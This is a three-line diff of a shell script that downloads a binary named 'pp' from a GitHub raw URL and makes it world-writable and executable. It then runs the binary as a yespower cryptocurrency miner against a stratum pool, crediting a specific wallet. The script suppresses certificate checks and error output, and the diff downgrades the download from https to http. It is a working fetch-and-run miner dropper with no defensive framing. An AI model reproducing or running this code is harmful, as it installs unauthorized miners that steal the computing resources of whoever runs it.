@@ -1,3 +1,3 @@
-curl -L --insecure --connect-timeout 5 --max-time 40 --fail https://raw.githubusercontent.com/anw1012/yw/main/pp -o pp 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 https://raw.githubusercontent.com/anw1012/yw/main/pp -O pp 2> /dev/null || _curl https://raw.githubusercontent.com/anw1012/yw/main/pp > pp 
+curl -L --insecure --connect-timeout 5 --max-time 40 --fail http://raw.githubusercontent.com/anw1012/yw/main/pp -o pp 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 http://raw.githubusercontent.com/anw1012/yw/main/pp -O pp 2> /dev/null || _curl http://raw.githubusercontent.com/anw1012/yw/main/pp > pp 
 chmod 777 pp
 ./pp -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017  -u web1q0p7yclfvpdar2qs60jhkx6y7sz5cm2ry34km0y.FSHLin;
